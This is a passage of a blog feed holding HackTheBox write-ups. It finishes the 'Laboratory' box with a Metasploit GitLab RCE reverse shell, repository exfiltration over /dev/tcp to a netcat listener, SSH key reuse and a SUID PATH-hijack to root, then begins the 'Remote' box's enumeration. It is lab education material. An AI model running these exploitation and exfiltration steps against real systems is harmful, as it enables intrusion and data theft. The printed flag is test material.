<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «laboratory» «10.10.14.39»
$ cd /usr/share/metasploit-framework/modules/exploits/multi/http <span style="color:#f92672">&amp;&amp;</span> wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/gitlab_file_read_rce.rb
</code></pre></div><p>After that I’ll re-initialize the metasploit database using <code>msfdb</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
$ msfdb reinit
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting database
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dropping databases <span style="color:#e6db74">&#39;msf&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dropping databases <span style="color:#e6db74">&#39;msf_test&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dropping database user <span style="color:#e6db74">&#39;msf&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleting configuration file /usr/share/metasploit-framework/config/database.yml
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Stopping database
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting database
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Creating database user <span style="color:#e6db74">&#39;msf&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Creating databases <span style="color:#e6db74">&#39;msf&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Creating databases <span style="color:#e6db74">&#39;msf_test&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Creating configuration file <span style="color:#e6db74">&#39;/usr/share/metasploit-framework/config/database.yml&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Creating initial database schema
</code></pre></div><p>Now on Metasploit, I can use the module by issuing the command below:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 &gt; use exploit/multi/http/gitlab_file_read_rce
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to generic/shell_reverse_tcp
</code></pre></div><p>Below are the options needed by the module.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set USERNAME iamf
USERNAME <span style="color:#f92672">=</span>&gt; iamf
msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set PASSWORD iamfiamf
PASSWORD <span style="color:#f92672">=</span>&gt; iamfiamf
msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set RHOSTS 10.10.10.216
RHOSTS <span style="color:#f92672">=</span>&gt; 10.10.10.216
msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set RPORT <span style="color:#ae81ff">443</span>
RPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">443</span>
msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set SSL true
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Changing the SSL option’s value may require changing RPORT!
SSL <span style="color:#f92672">=</span>&gt; true
msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set VHOST git.laboratory.htb
VHOST <span style="color:#f92672">=</span>&gt; git.laboratory.htb
msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set LHOST tun0
LHOST <span style="color:#f92672">=</span>&gt; tun0
msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">9001</span>
LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">9001</span>
</code></pre></div><p>After all the required options are set, I’ll start the exploit with the <code>run</code> command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; run
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.39:9001 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing automatic check <span style="color:#f92672">(</span>disable AutoCheck to override<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Logged in to user iamf
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Created project /iamf/hpt2TORA
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Created project /iamf/ysGE0u0L
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Created issue /iamf/hpt2TORA/issues/1
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing arbitrary file load
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> File saved as: <span style="color:#e6db74">&#39;/root/.msf4/loot/20210321174611_default_10.10.10.216_gitlab.secrets_490542.txt&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file read
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attempting to delete project /iamf/hpt2TORA
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Deleted project /iamf/hpt2TORA
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attempting to delete project /iamf/ysGE0u0L
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Deleted project /iamf/ysGE0u0L
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.39:9001 -&gt; 10.10.10.216:52726<span style="color:#f92672">)</span> at 2021-03-21 17:46:14 -0400

id;hostname
uid<span style="color:#f92672">=</span>998<span style="color:#f92672">(</span>git<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>998<span style="color:#f92672">(</span>git<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>998<span style="color:#f92672">(</span>git<span style="color:#f92672">)</span>
git.laboratory.htb
</code></pre></div><p>I have shell as user <code>git</code>.</p>
<p>There is a <code>.dockerenv</code> file in the root directory. This indicates that I&rsquo;m inside a docker container.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ls -la /
total <span style="color:#ae81ff">88</span>
drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2020</span> .
drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2020</span> ..
-rwxr-xr-x   <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">0</span> Jul  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2020</span> .dockerenv
-rw-r--r--   <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">157</span> Feb <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> RELEASE
drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> assets
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-dexter">Shell as dexter</h3>
<h4 id="container-enumeration">Container enumeration</h4>
<p>Enumerating the <code>git</code> home directory (<code>/var/opt/gitlab</code>) discovers two repositories that belongs to user <code>dexter</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@git:~$ grep -Ri dexter 2&gt;/dev/null

git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git/config:        fullpath <span style="color:#f92672">=</span> dexter/securedocker
git-data/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.git/config:        fullpath <span style="color:#f92672">=</span> dexter/securewebsite
</code></pre></div><p>I haven&rsquo;t seen that <code>dexter/securedocker</code> before in the GitLab application. So I&rsquo;ll grab that repository and transfer it to my machine</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@git:~/git-data/repositories/@hashed/19/58$ ls -la 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
total <span style="color:#ae81ff">40</span>
drwxr-s---  <span style="color:#ae81ff">6</span> git root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> .
drwxr-s---  <span style="color:#ae81ff">4</span> git root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> ..
-rw-r--r--  <span style="color:#ae81ff">1</span> git root   <span style="color:#ae81ff">23</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> HEAD
-rw-r--r--  <span style="color:#ae81ff">1</span> git root  <span style="color:#ae81ff">107</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> config
-rw-r--r--  <span style="color:#ae81ff">1</span> git root   <span style="color:#ae81ff">73</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> description
drwxr-sr-x  <span style="color:#ae81ff">2</span> git root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> hooks
drwxr-sr-x  <span style="color:#ae81ff">2</span> git root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> info
-rw-r--r--  <span style="color:#ae81ff">1</span> git root  <span style="color:#ae81ff">112</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> language-stats.cache
drwxr-sr-x <span style="color:#ae81ff">14</span> git root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> objects
drwxr-sr-x  <span style="color:#ae81ff">4</span> git root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> refs
</code></pre></div><p>First, I’ll create a tarball archive of that repository and I’ll name it as <code>exfil-securedocker-git.tar</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@git:~/git-data/repositories/@hashed/19/58/$ tar -czf /tmp/exfil-securedocker-git.tar 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
</code></pre></div><p>On my machine, I&rsquo;ll setup a listener</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.39»
$ nc -nvlp <span style="color:#ae81ff">9000</span> &gt; exfil-securedocker-git.tar
</code></pre></div><p>Back on Laboratory, I’ll send the repository  tarball to my machine using <code>cat</code> and <code>bash</code> trick</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@git:~/git-data/repositories/@hashed/19/58/$ cat /tmp/exfil-securedocker-git.tar &gt; /dev/tcp/10.10.14.39/9000
</code></pre></div><p>My listener received the tarball.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.39»
$ nc -nvlp <span style="color:#ae81ff">9000</span> &gt; exfil-securedocker-git.tar
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9000</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.39<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.216<span style="color:#f92672">]</span> <span style="color:#ae81ff">42426</span>
</code></pre></div><h4 id="recover-securedocker-repository">Recover &lsquo;securedocker&rsquo; repository</h4>
<p>After extracting the repository, I saw <code>git:(master)</code> pop up in my zsh prompt which indicates this is a git repository.</p>
<p>But, when I try to read the repository status, it returns an error message.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.39»
$ tar -xzf exfil-securedocker-git.tar

→ root@iamf «loot» «10.10.14.39»
$ cd 19581e27de7ced....5ef03f7c3017bb5b7.git

→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span>
$ git status
fatal: this operation must be run in a work tree
</code></pre></div><blockquote>
<p>I&rsquo;ve renamed <code>19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git</code> to <code>secure-docker.git</code>.</p>
</blockquote>
<p>This problem can be resolved by creating a new <code>.git</code> folder within <code>secure-docker.git</code> and transferring all the files from <code>secure-docker.git</code> to the newly created <code>.git</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span>
$ mkdir .git
→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span>
$ mv * .git
→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span>
$ git status
fatal: this operation must be run in a work tree
</code></pre></div><p>Finally, use the <code>git init</code> command to re-initialize the git repository.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span>
$ git init
Reinitialized existing Git repository in /root/htb/to-do/laboratory/loot/secure-docer.git/.git/

→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
$ git status
On branch master
Changes to be committed:
  <span style="color:#f92672">(</span>use <span style="color:#e6db74">&#34;git restore --staged &lt;file&gt;...&#34;</span> to unstage<span style="color:#f92672">)</span>
        deleted:    README.md
        deleted:    create_gitlab.sh
        deleted:    dexter/.ssh/authorized_keys
        deleted:    dexter/.ssh/id_rsa
        deleted:    dexter/recipe.url
        deleted:    dexter/todo.txt
</code></pre></div><p>Interestingly, this repository contains a set of SSH keys.</p>
<h4 id="ssh---dexter">SSH - dexter</h4>
<p>I can restore the deleted files with <code>git checkout --</code> command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
$ git checkout --
→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
$ ls -la
total <span style="color:#ae81ff">20</span>
drwxr-xr-x <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">22</span> 09:36 .
drwxr-xr-x <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">22</span> 09:36 ..
-rw-r--r-- <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">102</span> Mar <span style="color:#ae81ff">22</span> 09:36 recipe.url
drwxr-xr-x <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">22</span> 09:36 .ssh
-rw-r--r-- <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">160</span> Mar <span style="color:#ae81ff">22</span> 09:36 todo.txt
</code></pre></div><p>I can now login as <code>dexter</code> using the SSH key I obtained.</p>
<p>At first try, it says the key is invalid format.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
$ chmod <span style="color:#ae81ff">600</span> dexter/.ssh/id_rsa
→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
$ ssh -i dexter/.ssh/id_rsa dexter@10.10.10.216
Load key <span style="color:#e6db74">&#34;id_rsa&#34;</span>: invalid format
dexter@10.10.10.216: Permission denied <span style="color:#f92672">(</span>publickey<span style="color:#f92672">)</span>.
</code></pre></div><p>I fixed that by adding an empty string using the <code>echo</code> command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
$ echo <span style="color:#e6db74">&#39;&#39;</span> &gt;&gt; dexter/.ssh/id_rsa
</code></pre></div><p>Now it logs me in.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
$ ssh -i id_rsa dexter@10.10.10.216
dexter@laboratory:~$
dexter@laboratory:~$ id;hostname
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dexter<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dexter<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dexter<span style="color:#f92672">)</span>
laboratory
dexter@laboratory:~$ ls -l
total <span style="color:#ae81ff">4</span>
-r--r----- <span style="color:#ae81ff">1</span> root dexter <span style="color:#ae81ff">33</span> Mar <span style="color:#ae81ff">22</span> 10:06 user.txt
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>The contents of <code>todo.txt</code> talks something about “docker security”, but I have no idea what it is except it uses three hashtags.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
$ cat dexter/todo.txt
<span style="color:#75715e"># DONE: Secure docker for regular users</span>
<span style="color:#75715e">### DONE: Automate docker security on startup</span>
<span style="color:#75715e"># TODO: Look into &#34;docker compose&#34;</span>
<span style="color:#75715e"># TODO: Permanently ban DeeDee from lab#</span>
</code></pre></div><p>It turns out it’s a binary name which has a SUID bit set found by Linpeas.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">...&lt;SNIP&gt;...
════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SUID - Check easy privesc, exploits and write perms                                                                                
-rwsr-xr-x <span style="color:#ae81ff">1</span> root   dexter           17K Aug <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2020</span> /usr/local/bin/docker-security
</code></pre></div><p>Inspecting the binary with the <code>ltrace</code> command finds out that it uses relative path to call <code>chmod</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dexter@laboratory:~$ ltrace docker-security 

setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>                                                                                                <span style="color:#f92672">=</span> -1
setgid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>                                                                                                <span style="color:#f92672">=</span> -1
system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;chmod 700 /usr/bin/docker&#34;</span>chmod: changing permissions of <span style="color:#e6db74">&#39;/usr/bin/docker&#39;</span>: Operation not permitted
 &lt;no <span style="color:#66d9ef">return</span> ...&gt;
--- SIGCHLD <span style="color:#f92672">(</span>Child exited<span style="color:#f92672">)</span> ---
&lt;... system resumed&gt; <span style="color:#f92672">)</span>                                                                                   <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span>
system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;chmod 660 /var/run/docker.sock&#34;</span>chmod: changing permissions of <span style="color:#e6db74">&#39;/var/run/docker.sock&#39;</span>: Operation not permitted
 &lt;no <span style="color:#66d9ef">return</span> ...&gt;
--- SIGCHLD <span style="color:#f92672">(</span>Child exited<span style="color:#f92672">)</span> ---
&lt;... system resumed&gt; <span style="color:#f92672">)</span>                                                                                   <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span>
+++ exited <span style="color:#f92672">(</span>status 0<span style="color:#f92672">)</span> +++
</code></pre></div><p>Knowing this, I could hijack the execution path.</p>
<h4 id="suid---path-hijack">SUID - Path Hijack</h4>
<p>First, I&rsquo;ll create a fake <code>chmod</code> that calls <code>bash</code> binary at <code>/dev/shm</code>, I&rsquo;ll also add an execute permission on that file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dexter@laboratory:~$ cd /dev/shm
dexter@laboratory:/dev/shm$ echo -e <span style="color:#e6db74">&#39;#!/bin/bash\n/bin/bash&#39;</span> &gt; chmod
dexter@laboratory:/dev/shm$
dexter@laboratory:/dev/shm$ /bin/chmod +x chmod
</code></pre></div><p>Next, I&rsquo;ll add current directory (<code>/dev/shm</code>) to <code>$PATH</code> variable. Now if I call <code>chmod</code>, it will point to my <code>chmod</code> on <code>/dev/shm</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dexter@laboratory:/dev/shm$ export PATH<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>:$PATH
dexter@laboratory:/dev/shm$
dexter@laboratory:/dev/shm$ which chmod
/dev/shm/chmod
</code></pre></div><p>From there, I can just execute <code>docker-security</code> to obtain a root access as well as the root flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">dexter@laboratory:/dev/shm$ docker-security 
root@laboratory:/dev/shm#
root@laboratory:/dev/shm# cut -c6- /root/root.txt 
9f593f335a0a1f403c753719eb6
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://hackerone.com/reports/827052">https://hackerone.com/reports/827052</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Remote</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-remote/</link>
      <pubDate>Mon, 05 Apr 2021 20:21:24 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-remote/</guid>
      <description>Enumerating public NFS and gain access to sensitive files</description>
      <content:encoded><![CDATA[<p>Remote features an instance of Umbraco CMS which is vulnerable to an authenticated remote code execution (RCE). Enumeration on publicly accessible backup on NFS share finds credentials, which allows me to gain a foothold on the system. Internal enumeration with WinPEAS finds two interesting privilege escalation vectors, the first one with TeamViewer7 and the other one is the ability to modify and restart an unquoted service path. TeamViewer7 is found to be vulnerable to CVE-2019-18988, <code>Metasploit</code> has a module to exploit this CVE and harvest the TeamViewer credentials. The credentials are work with the administrator account.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>NFS enumeration</li>
<li>Umbraco CMS 7.12.4 exploitation</li>
<li>Metasploit</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>metasploit - Preinstalled in Kali Linux</li>
<li>nfs-common - <code>apt install nfs-common</code></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «remote» «10.10.14.3»
$ nmap -sC -sV -oA scans/initial-remote <span style="color:#e6db74">&#39;10.10.10.180&#39;</span>
</code></pre></div><ul>
<li><code>-sC</code>, to scan with default script</li>
<li><code>-sV</code>, to scan service version</li>
<li><code>-oA</code>, to save the output to all format (xml, nmap, gnmap)</li>
<li><code>-v</code>, verbose mode.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">... &lt;snip&gt; ...
Host is up (0.20s latency).
Not shown: 993 closed ports
PORT STATE SERVICE VERSION
21/tcp open ftp Microsoft ftpd #1
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_ SYST: Windows_NT
80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) #2
|_http-title: Home — Acme Widgets
111/tcp open rpcbind 2–4 (RPC #100000) 
| rpcinfo: 
| program version port/proto service 
| 100000 2,3,4 111/tcp rpcbind 
| 100000 2,3,4 111/tcp6 rpcbind 
| 100000 2,3,4 111/udp rpcbind 
| 100000 2,3,4 111/udp6 rpcbind 
| 100003 2,3 2049/udp nfs 
| 100003 2,3 2049/udp6 nfs 
| 100003 2,3,4 2049/tcp nfs 
| 100003 2,3,4 2049/tcp6 nfs 
| 100005 1,2,3 2049/tcp mountd 
| 100005 1,2,3 2049/tcp6 mountd 
| 100005 1,2,3 2049/udp mountd 
| 100005 1,2,3 2049/udp6 mountd 
| 100021 1,2,3,4 2049/tcp nlockmgr 
| 100021 1,2,3,4 2049/tcp6 nlockmgr 
| 100021 1,2,3,4 2049/udp nlockmgr 
| 100021 1,2,3,4 2049/udp6 nlockmgr 
| 100024 1 2049/tcp status 
| 100024 1 2049/tcp6 status 
| 100024 1 2049/udp status 
|_ 100024 1 2049/udp6 status 
135/tcp open msrpc Microsoft Windows RPC 
139/tcp open netbios-ssn Microsoft Windows netbios-ssn 
445/tcp open microsoft-ds? 
2049/tcp open mountd 1–3 (RPC #100005) #3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:
|_clock-skew: -25s
| smb2-security-mode: 
| 2.02: 
|_ Message signing enabled but not required
| smb2-time: 
| date: 2020–03–28T21:04:26
|_ start_date: N/A
... &lt;snip&gt; ...
</code></pre></div><p>The result shows a bunch of open ports.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-21---ftp">TCP 21 - FTP</h3>
<p>Anonymous login is allowed, but nothing here.</p>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p><img src="https://miro.medium.com/max/955/1*yMpV5s03RUP6MvF9J_2euw.png" alt="img" style="zoom:80%;" /></p>
<p>In contact menu, there&rsquo;s a button that points to <code>http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms</code></p>
<p><img src="imgs/image-20210406053255081.png" alt="image-20210406053255081" style="zoom:80%;" /></p>
<p>The link brought me into Umbraco&rsquo;s login page.</p>
<center>
<img src="imgs/image-20210406053525360.png" alt="image-20210406053525360" style="zoom:80%;" />
</center>
Brute forcing some common credentials with Burp doesn't show any difference.
<h3 id="tcp-2049---nfs">TCP 2049 - NFS</h3>
<p>NFS shares can be enumerated using the <code>showmount</code> command.</p>
<blockquote>
<p>If you don’t have it, install with <code>sudo apt install nfs-common</code></p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «remote» «10.10.14.3»
